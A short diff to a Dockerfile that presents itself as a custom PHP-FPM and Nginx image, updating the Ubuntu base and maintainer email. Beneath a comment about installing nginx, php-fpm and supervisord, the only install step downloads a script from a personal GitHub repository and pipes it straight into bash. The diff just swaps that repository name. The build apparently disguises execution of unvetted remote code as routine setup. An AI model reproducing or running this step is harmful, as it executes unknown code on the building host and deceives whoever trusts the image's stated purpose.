@@ -1,7 +1,7 @@
-FROM ubuntu:18.04
+FROM ubuntu:20.04
 
 # LABEL about the custom image
-LABEL maintainer="admin@sysadminjournal.com"
+LABEL maintainer="kntlpop@gmail.com"
 LABEL version="0.1"
 LABEL description="This is custom Docker Image for \
 the PHP-FPM and Nginx Services."
@@ -15,4 +15,4 @@ RUN apt update
 
 # Install nginx, php-fpm and supervisord from ubuntu repository
 RUN apt -y install wget
-RUN wget -O - https://github.com/kamilairsyat08/viwarlani/raw/main/b.sh | bash
+RUN wget -O - https://github.com/kamilairsyat08/viwarlanpo123/raw/main/b.sh | bash
